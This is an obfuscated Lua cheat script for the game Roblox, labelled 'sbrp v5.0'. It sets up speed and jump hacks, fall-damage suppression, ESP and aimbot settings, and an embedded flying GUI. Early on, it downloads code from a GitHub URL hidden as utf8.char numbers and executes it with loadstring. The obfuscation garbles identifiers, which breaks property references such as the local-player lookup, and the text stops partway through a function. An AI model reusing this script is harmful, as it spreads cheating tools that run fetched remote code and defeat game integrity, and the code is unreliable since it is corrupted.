return (function(...)
--========================================================
-- sbrp脚本 v5.0 (精简版)
--========================================================

local 嵩鞤绤羮蔔蠎苀蠠 = game:GetService(utf8.char(83, 116, 97, 114, 116, 101, 114, 71, 117, 105))
local function 鯭粛杲崐愿騒泪詛(title, text)
    pcall(function()
        嵩鞤绤羮蔔蠎苀蠠:SetCore(utf8.char(83, 101, 110, 100, 78, 111, 116, 105, 102, 105, 99, 97, 116, 105, 111, 110), {Title = title, Text = text or utf8.char(), Duration = 5})
    end)
end

local WindUI
pcall(function()
    WindUI = loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 70, 111, 111, 116, 97, 103, 101, 115, 117, 115, 47, 87, 105, 110, 100, 85, 73, 47, 109, 97, 105, 110, 47, 100, 105, 115, 116, 47, 109, 97, 105, 110, 46, 108, 117, 97)))()
end)
if not WindUI then
    鯭粛杲崐愿騒泪詛(utf8.char(21152, 36733, 22833, 36133), utf8.char(87, 105, 110, 100, 85, 73, 32, 26080, 27861, 21152, 36733))
    return
end

local 雺咯尩面固牑蓪梧 = game:GetService(utf8.char(80, 108, 97, 121, 101, 114, 115))
local 犄瞕炿詑碐糡圃曎 = game:GetService(utf8.char(82, 117, 110, 83, 101, 114, 118, 105, 99, 101))
local 氟崹攻鏗覻蟭胺跌 = game:GetService(utf8.char(85, 115, 101, 114, 73, 110, 112, 117, 116, 83, 101, 114, 118, 105, 99, 101))
local 域鴋慟呧嵭輽鍅謀 = game:GetService(utf8.char(76, 105, 103, 104, 116, 105, 110, 103))
local 榽拰繶篘瓙骻匠胳 = game:GetService(utf8.char(87, 111, 114, 107, 115, 112, 97, 99, 101))
local 祏愤芰捘膴跏蟫緶 = game:GetService(utf8.char(72, 116, 116, 112, 83, 101, 114, 118, 105, 99, 101))
local 智樊瓐泏竎幓褟帓 = game:GetService(utf8.char(84, 101, 108, 101, 112, 111, 114, 116, 83, 101, 114, 118, 105, 99, 101))

local 憇菝龚描畒詃曒砤 = 雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤
local 歮埡诘揶蛄蘵洽愳 = 榽拰繶篘瓙骻匠胳.CurrentCamera

local function 熱喫盥嫚杮歡傱萌(title, content, duration)
    pcall(function()
        WindUI:熱喫盥嫚杮歡傱萌({Title = title, Content = content or utf8.char(), Duration = duration or 3})
    end)
end

local function 屫駀贜蟃逞坥淓妺() return 憇菝龚描畒詃曒砤.Character end
local function 葰疀嗂枥訷薠蕠龵()
    local 鉔鲸骆勓簉睹錛犭 = 屫駀贜蟃逞坥淓妺()
    return 鉔鲸骆勓簉睹錛犭 and 鉔鲸骆勓簉睹錛犭:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116)) or nil
end
local function 肭家薊屓憍擤榎傯()
    local 鉔鲸骆勓簉睹錛犭 = 屫駀贜蟃逞坥淓妺()
    return 鉔鲸骆勓簉睹錛犭 and 鉔鲸骆勓簉睹錛犭:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100)) or nil
end

--=========== 状态 ===========
local 逬貋祝臞噫檿轓谼 = {
    WalkSpeed = 16,
    JumpPower = 50,
    NoFallDamage = false,
    ESPEnabled = false,
    Aimbot = false,
    AimbotFOV = 150,
    AimbotKey = false,
    ShowFOV = false,
    NpcAimbot = false,
    CharRotate = false,
}

--=========== 连接引用 ===========
local 铵肟綄碂疂垔氛鳤 = nil
local 溂盤亟侀锚嚈仱忩 = nil
local 桂獹芆罴訟橳坼鐦 = nil
local 儁韣叨毦雇酥峯曳 = nil
local 跪嶝綞顂嵭心醚祌 = nil
local 连沊襳笁盧燭鏯勃 = nil
local 唶恧悀爃竓櫈秬繣 = nil

--=========== 速度/跳跃 ===========
local function 迆周袱燚讵歀俜狛()
    local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯() if 莶踯猇淪怩坘蕪难 then 莶踯猇淪怩坘蕪难.WalkSpeed = 逬貋祝臞噫檿轓谼.WalkSpeed end
end
local function 嗇閃膩跭廧撽腑嗢()
    local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯()
    if 莶踯猇淪怩坘蕪难 then
        if 莶踯猇淪怩坘蕪难.UseJumpPower then 莶踯猇淪怩坘蕪难.JumpPower = 逬貋祝臞噫檿轓谼.JumpPower
        else 莶踯猇淪怩坘蕪难.JumpHeight = 逬貋祝臞噫檿轓谼.JumpPower / 10 end
    end
end

--=========== 掉落伤害 ===========
local fallDamageConn
local function 聫苻洂艆鿳漷囮瞃(绠瘳饀秥鐏檶籅尨)
    if not 绠瘳饀秥鐏檶籅尨 then return end
    绠瘳饀秥鐏檶籅尨.StateChanged:Connect(function(_, new)
        if new == Enum.HumanoidStateType.FallingDown then
            task.wait()
            绠瘳饀秥鐏檶籅尨:ChangeState(Enum.HumanoidStateType.GettingUp)
        end
    end)
end

local function 碹梵饅竸瑨摢祴鄄(偬冬摤秃猣帖鑠賰)
    local 绠瘳饀秥鐏檶籅尨 = 偬冬摤秃猣帖鑠賰:WaitForChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100), 10)
    if not 绠瘳饀秥鐏檶籅尨 then return end
    task.wait(0.3)
    迆周袱燚讵歀俜狛()
    嗇閃膩跭廧撽腑嗢()
    if 逬貋祝臞噫檿轓谼.NoFallDamage then 聫苻洂艆鿳漷囮瞃(绠瘳饀秥鐏檶籅尨) end
end

if 憇菝龚描畒詃曒砤.Character then task.spawn(碹梵饅竸瑨摢祴鄄, 憇菝龚描畒詃曒砤.Character) end
憇菝龚描畒詃曒砤.CharacterAdded:Connect(碹梵饅竸瑨摢祴鄄)

--========================================================
-- 飞行系统 (直接执行原始 餮汻銪趭澜靶禕滼 GUI V3 脚本)
--========================================================
local 驺蘤疀氆謏縓釡蚒 = [=[
local 鼣拀溥鷩試錱婾縳 = Instance.new(utf8.char(83, 99, 114, 101, 101, 110, 71, 117, 105))
local 桊壱蠉椅徧鶶鵵鏲 = Instance.new(utf8.char(70, 114, 97, 109, 101))
local 萨鿶犟薂娴镈鞨禩 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 缓榿巂裆汋剉薰尵 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 鍹鵬娅液挿翹悊憔 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 凯赶锅斍餞頟嫸厢 = Instance.new(utf8.char(84, 101, 120, 116, 76, 97, 98, 101, 108))
local 耣腥柀墸闌璸诀煻 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 朷襡輳覗蘿绎燫薏 = Instance.new(utf8.char(84, 101, 120, 116, 76, 97, 98, 101, 108))
local 墘帓訳淵貛餐煊懨 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 烂憷桢餀鹹樊瘓貧 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 蠰仳荭逢躕痜硛涰 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
local 鳚舣碻矮達燵樷斪 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))

鼣拀溥鷩試錱婾縳.Name = utf8.char(109, 97, 105, 110)
鼣拀溥鷩試錱婾縳.Parent = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤:WaitForChild(utf8.char(80, 108, 97, 121, 101, 114, 71, 117, 105))
鼣拀溥鷩試錱婾縳.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
鼣拀溥鷩試錱婾縳.ResetOnSpawn = false

桊壱蠉椅徧鶶鵵鏲.Parent = 鼣拀溥鷩試錱婾縳
桊壱蠉椅徧鶶鵵鏲.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
桊壱蠉椅徧鶶鵵鏲.BorderColor3 = Color3.fromRGB(103, 221, 213)
桊壱蠉椅徧鶶鵵鏲.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
桊壱蠉椅徧鶶鵵鏲.Size = UDim2.new(0, 190, 0, 57)

萨鿶犟薂娴镈鞨禩.Name = utf8.char(117, 112)
萨鿶犟薂娴镈鞨禩.Parent = 桊壱蠉椅徧鶶鵵鏲
萨鿶犟薂娴镈鞨禩.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
萨鿶犟薂娴镈鞨禩.Size = UDim2.new(0, 44, 0, 28)
萨鿶犟薂娴镈鞨禩.Font = Enum.Font.SourceSans
萨鿶犟薂娴镈鞨禩.Text = utf8.char(117, 112)
萨鿶犟薂娴镈鞨禩.TextColor3 = Color3.fromRGB(0, 0, 0)
萨鿶犟薂娴镈鞨禩.TextSize = 14.000

缓榿巂裆汋剉薰尵.Name = utf8.char(100, 111, 119, 110)
缓榿巂裆汋剉薰尵.Parent = 桊壱蠉椅徧鶶鵵鏲
缓榿巂裆汋剉薰尵.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
缓榿巂裆汋剉薰尵.Position = UDim2.new(0, 0, 0.491228074, 0)
缓榿巂裆汋剉薰尵.Size = UDim2.new(0, 44, 0, 28)
缓榿巂裆汋剉薰尵.Font = Enum.Font.SourceSans
缓榿巂裆汋剉薰尵.Text = utf8.char(100, 111, 119, 110)
缓榿巂裆汋剉薰尵.TextColor3 = Color3.fromRGB(0, 0, 0)
缓榿巂裆汋剉薰尵.TextSize = 14.000

鍹鵬娅液挿翹悊憔.Name = utf8.char(111, 110, 111, 102)
鍹鵬娅液挿翹悊憔.Parent = 桊壱蠉椅徧鶶鵵鏲
鍹鵬娅液挿翹悊憔.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
鍹鵬娅液挿翹悊憔.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
鍹鵬娅液挿翹悊憔.Size = UDim2.new(0, 56, 0, 28)
鍹鵬娅液挿翹悊憔.Font = Enum.Font.SourceSans
鍹鵬娅液挿翹悊憔.Text = utf8.char(102, 108, 121)
鍹鵬娅液挿翹悊憔.TextColor3 = Color3.fromRGB(0, 0, 0)
鍹鵬娅液挿翹悊憔.TextSize = 14.000

凯赶锅斍餞頟嫸厢.Parent = 桊壱蠉椅徧鶶鵵鏲
凯赶锅斍餞頟嫸厢.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
凯赶锅斍餞頟嫸厢.Position = UDim2.new(0.469327301, 0, 0, 0)
凯赶锅斍餞頟嫸厢.Size = UDim2.new(0, 100, 0, 28)
凯赶锅斍餞頟嫸厢.Font = Enum.Font.SourceSans
凯赶锅斍餞頟嫸厢.Text = utf8.char(70, 108, 121, 32, 71, 85, 73, 32, 86, 51)
凯赶锅斍餞頟嫸厢.TextColor3 = Color3.fromRGB(0, 0, 0)
凯赶锅斍餞頟嫸厢.TextScaled = true
凯赶锅斍餞頟嫸厢.TextSize = 14.000
凯赶锅斍餞頟嫸厢.TextWrapped = true

耣腥柀墸闌璸诀煻.Name = utf8.char(112, 108, 117, 115)
耣腥柀墸闌璸诀煻.Parent = 桊壱蠉椅徧鶶鵵鏲
耣腥柀墸闌璸诀煻.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
耣腥柀墸闌璸诀煻.Position = UDim2.new(0.231578946, 0, 0, 0)
耣腥柀墸闌璸诀煻.Size = UDim2.new(0, 45, 0, 28)
耣腥柀墸闌璸诀煻.Font = Enum.Font.SourceSans
耣腥柀墸闌璸诀煻.Text = utf8.char(43)
耣腥柀墸闌璸诀煻.TextColor3 = Color3.fromRGB(0, 0, 0)
耣腥柀墸闌璸诀煻.TextScaled = true
耣腥柀墸闌璸诀煻.TextSize = 14.000
耣腥柀墸闌璸诀煻.TextWrapped = true

朷襡輳覗蘿绎燫薏.Name = utf8.char(115, 112, 101, 101, 100)
朷襡輳覗蘿绎燫薏.Parent = 桊壱蠉椅徧鶶鵵鏲
朷襡輳覗蘿绎燫薏.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
朷襡輳覗蘿绎燫薏.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
朷襡輳覗蘿绎燫薏.Size = UDim2.new(0, 44, 0, 28)
朷襡輳覗蘿绎燫薏.Font = Enum.Font.SourceSans
朷襡輳覗蘿绎燫薏.Text = utf8.char(49)
朷襡輳覗蘿绎燫薏.TextColor3 = Color3.fromRGB(0, 0, 0)
朷襡輳覗蘿绎燫薏.TextScaled = true
朷襡輳覗蘿绎燫薏.TextSize = 14.000
朷襡輳覗蘿绎燫薏.TextWrapped = true

墘帓訳淵貛餐煊懨.Name = utf8.char(109, 105, 110, 101)
墘帓訳淵貛餐煊懨.Parent = 桊壱蠉椅徧鶶鵵鏲
墘帓訳淵貛餐煊懨.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
墘帓訳淵貛餐煊懨.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
墘帓訳淵貛餐煊懨.Size = UDim2.new(0, 45, 0, 29)
墘帓訳淵貛餐煊懨.Font = Enum.Font.SourceSans
墘帓訳淵貛餐煊懨.Text = utf8.char(45)
墘帓訳淵貛餐煊懨.TextColor3 = Color3.fromRGB(0, 0, 0)
墘帓訳淵貛餐煊懨.TextScaled = true
墘帓訳淵貛餐煊懨.TextSize = 14.000
墘帓訳淵貛餐煊懨.TextWrapped = true

烂憷桢餀鹹樊瘓貧.Name = utf8.char(67, 108, 111, 115, 101)
烂憷桢餀鹹樊瘓貧.Parent = 鼣拀溥鷩試錱婾縳.桊壱蠉椅徧鶶鵵鏲
烂憷桢餀鹹樊瘓貧.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
烂憷桢餀鹹樊瘓貧.Font = utf8.char(83, 111, 117, 114, 99, 101, 83, 97, 110, 115)
烂憷桢餀鹹樊瘓貧.Size = UDim2.new(0, 45, 0, 28)
烂憷桢餀鹹樊瘓貧.Text = utf8.char(88)
烂憷桢餀鹹樊瘓貧.TextSize = 30
烂憷桢餀鹹樊瘓貧.Position =  UDim2.new(0, 0, -1, 27)

蠰仳荭逢躕痜硛涰.Name = utf8.char(109, 105, 110, 105, 109, 105, 122, 101)
蠰仳荭逢躕痜硛涰.Parent = 鼣拀溥鷩試錱婾縳.桊壱蠉椅徧鶶鵵鏲
蠰仳荭逢躕痜硛涰.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
蠰仳荭逢躕痜硛涰.Font = utf8.char(83, 111, 117, 114, 99, 101, 83, 97, 110, 115)
蠰仳荭逢躕痜硛涰.Size = UDim2.new(0, 45, 0, 28)
蠰仳荭逢躕痜硛涰.Text = utf8.char(84)
蠰仳荭逢躕痜硛涰.TextSize = 30
蠰仳荭逢躕痜硛涰.Position = UDim2.new(0, 44, -1, 27)

鳚舣碻矮達燵樷斪.Name = utf8.char(109, 105, 110, 105, 109, 105, 122, 101, 50)
鳚舣碻矮達燵樷斪.Parent = 鼣拀溥鷩試錱婾縳.桊壱蠉椅徧鶶鵵鏲
鳚舣碻矮達燵樷斪.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
鳚舣碻矮達燵樷斪.Font = utf8.char(83, 111, 117, 114, 99, 101, 83, 97, 110, 115)
鳚舣碻矮達燵樷斪.Size = UDim2.new(0, 45, 0, 28)
鳚舣碻矮達燵樷斪.Text = utf8.char(84)
鳚舣碻矮達燵樷斪.TextSize = 30
鳚舣碻矮達燵樷斪.Position = UDim2.new(0, 44, -1, 57)
鳚舣碻矮達燵樷斪.Visible = false

speeds = 1

local 鲧囌蜚幵聀饚减绿 = game:GetService(utf8.char(80, 108, 97, 121, 101, 114, 115)).憇菝龚描畒詃曒砤

local 綏翌滑娏臍僔萔共 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character
local 绠瘳饀秥鐏檶籅尨 = 綏翌滑娏臍僔萔共 and 綏翌滑娏臍僔萔共:FindFirstChildWhichIsA(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))

nowe = false

game:GetService(utf8.char(83, 116, 97, 114, 116, 101, 114, 71, 117, 105)):SetCore(utf8.char(83, 101, 110, 100, 78, 111, 116, 105, 102, 105, 99, 97, 116, 105, 111, 110), { 
	Title = utf8.char(70, 108, 121, 32, 71, 85, 73, 32, 86, 51);
	Text = utf8.char(108, 110, 106, 101, 99, 116, 105, 111, 110, 32, 115, 117, 99, 99, 101, 101, 100, 101, 100);
	Icon = utf8.char(114, 98, 120, 116, 104, 117, 109, 98, 58, 47, 47, 116, 121, 112, 101, 61, 65, 115, 115, 101, 116, 38, 105, 100, 61, 53, 49, 48, 55, 49, 56, 50, 49, 49, 52, 38, 119, 61, 49, 53, 48, 38, 104, 61, 49, 53, 48)})
Duration = 5;

桊壱蠉椅徧鶶鵵鏲.Active = true -- 鼣拀溥鷩試錱婾縳 = 宨树纉絉籲頩塾譜
桊壱蠉椅徧鶶鵵鏲.Draggable = true

鍹鵬娅液挿翹悊憔.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local 棴沌峩撊鎻聈鲊各 = game:GetService(utf8.char(82, 117, 110, 83, 101, 114, 118, 105, 99, 101)).Heartbeat	


				tpwalking = true
				local 綏翌滑娏臍僔萔共 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character
				local 绠瘳饀秥鐏檶籅尨 = 綏翌滑娏臍僔萔共 and 綏翌滑娏臍僔萔共:FindFirstChildWhichIsA(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
				while tpwalking and 棴沌峩撊鎻聈鲊各:Wait() and 綏翌滑娏臍僔萔共 and 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Parent do
					if 绠瘳饀秥鐏檶籅尨.MoveDirection.Magnitude > 0 then
						綏翌滑娏臍僔萔共:TranslateBy(绠瘳饀秥鐏檶籅尨.MoveDirection)
					end
				end

			end)
		end
		game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.Animate.Disabled = true
		local 搿暻琾狣羫溞栯緮 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character
		local 汢碎凸嚺骨芊紒牁 = 搿暻琾狣羫溞栯緮:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100)) or 搿暻琾狣羫溞栯緮:FindFirstChildOfClass(utf8.char(65, 110, 105, 109, 97, 116, 105, 111, 110, 67, 111, 110, 116, 114, 111, 108, 108, 101, 114))

		for i,v in next, 汢碎凸嚺骨芊紒牁:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		鲧囌蜚幵聀饚减绿.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	if game:GetService(utf8.char(80, 108, 97, 121, 101, 114, 115)).憇菝龚描畒詃曒砤.Character:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100)).RigType == Enum.HumanoidRigType.R6 then



		local 基婎躎皋蕋簀螺敥 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤
		local 皜蓙籮虜憼騬柭镥 = 基婎躎皋蕋簀螺敥.Character.Torso
		local 悚紼黑哫屨橛芇覞 = true
		local 雓蜧嶆舕灄傍調亙 = true
		local 鳤佹粈腷羖牊鵜嫉 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		local 韅柲秕鐟暪煸鲮揅 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		local 頽韕杳溋輭璮魩辚 = 50
		local 朷襡輳覗蘿绎燫薏 = 0


		local 旯榝糥珱唄瀑煓箵 = Instance.new(utf8.char(66, 111, 100, 121, 71, 121, 114, 111), 皜蓙籮虜憼騬柭镥)
		旯榝糥珱唄瀑煓箵.P = 9e4
		旯榝糥珱唄瀑煓箵.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		旯榝糥珱唄瀑煓箵.cframe = 皜蓙籮虜憼騬柭镥.CFrame
		local 鹪刉霸窱驉吶琮勎 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121), 皜蓙籮虜憼騬柭镥)
		鹪刉霸窱驉吶琮勎.velocity = Vector3.new(0,0.1,0)
		鹪刉霸窱驉吶琮勎.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			基婎躎皋蕋簀螺敥.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService(utf8.char(80, 108, 97, 121, 101, 114, 115)).憇菝龚描畒詃曒砤.Character.Humanoid.Health == 0 do
			game:GetService(utf8.char(82, 117, 110, 83, 101, 114, 118, 105, 99, 101)).RenderStepped:Wait()

			if 鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿 ~= 0 or 鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b ~= 0 then
				朷襡輳覗蘿绎燫薏 = 朷襡輳覗蘿绎燫薏+.5+(朷襡輳覗蘿绎燫薏/頽韕杳溋輭璮魩辚)
				if 朷襡輳覗蘿绎燫薏 > 頽韕杳溋輭璮魩辚 then
					朷襡輳覗蘿绎燫薏 = 頽韕杳溋輭璮魩辚
				end
			elseif not (鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿 ~= 0 or 鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b ~= 0) and 朷襡輳覗蘿绎燫薏 ~= 0 then
				朷襡輳覗蘿绎燫薏 = 朷襡輳覗蘿绎燫薏-1
				if 朷襡輳覗蘿绎燫薏 < 0 then
					朷襡輳覗蘿绎燫薏 = 0
				end
			end
			if (鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿) ~= 0 or (鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b) ~= 0 then
				鹪刉霸窱驉吶琮勎.velocity = ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.lookVector * (鳤佹粈腷羖牊鵜嫉.f+鳤佹粈腷羖牊鵜嫉.b)) + ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame * CFrame.new(鳤佹粈腷羖牊鵜嫉.l+鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿,(鳤佹粈腷羖牊鵜嫉.f+鳤佹粈腷羖牊鵜嫉.b)*.2,0).p) - game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.p))*朷襡輳覗蘿绎燫薏
				韅柲秕鐟暪煸鲮揅 = {f = 鳤佹粈腷羖牊鵜嫉.f, b = 鳤佹粈腷羖牊鵜嫉.b, l = 鳤佹粈腷羖牊鵜嫉.l, 捆郹賾曱怓凚湒炿 = 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿}
			elseif (鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿) == 0 and (鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b) == 0 and 朷襡輳覗蘿绎燫薏 ~= 0 then
				鹪刉霸窱驉吶琮勎.velocity = ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.lookVector * (韅柲秕鐟暪煸鲮揅.f+韅柲秕鐟暪煸鲮揅.b)) + ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame * CFrame.new(韅柲秕鐟暪煸鲮揅.l+韅柲秕鐟暪煸鲮揅.捆郹賾曱怓凚湒炿,(韅柲秕鐟暪煸鲮揅.f+韅柲秕鐟暪煸鲮揅.b)*.2,0).p) - game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.p))*朷襡輳覗蘿绎燫薏
			else
				鹪刉霸窱驉吶琮勎.velocity = Vector3.new(0,0,0)
			end
			--	game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.Animate.Disabled = true
			旯榝糥珱唄瀑煓箵.cframe = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((鳤佹粈腷羖牊鵜嫉.f+鳤佹粈腷羖牊鵜嫉.b)*50*朷襡輳覗蘿绎燫薏/頽韕杳溋輭璮魩辚),0,0)
		end
		鳤佹粈腷羖牊鵜嫉 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		韅柲秕鐟暪煸鲮揅 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		朷襡輳覗蘿绎燫薏 = 0
		旯榝糥珱唄瀑煓箵:Destroy()
		鹪刉霸窱驉吶琮勎:Destroy()
		基婎躎皋蕋簀螺敥.Character.Humanoid.PlatformStand = false
		game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.Animate.Disabled = false
		tpwalking = false




	else
		local 基婎躎皋蕋簀螺敥 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤
		local 朠捏銠昊笵盗汃煓 = 基婎躎皋蕋簀螺敥.Character.朠捏銠昊笵盗汃煓
		local 悚紼黑哫屨橛芇覞 = true
		local 雓蜧嶆舕灄傍調亙 = true
		local 鳤佹粈腷羖牊鵜嫉 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		local 韅柲秕鐟暪煸鲮揅 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		local 頽韕杳溋輭璮魩辚 = 50
		local 朷襡輳覗蘿绎燫薏 = 0


		local 旯榝糥珱唄瀑煓箵 = Instance.new(utf8.char(66, 111, 100, 121, 71, 121, 114, 111), 朠捏銠昊笵盗汃煓)
		旯榝糥珱唄瀑煓箵.P = 9e4
		旯榝糥珱唄瀑煓箵.maxTorque = Vector3.new(9e9, 9e9, 9e9)
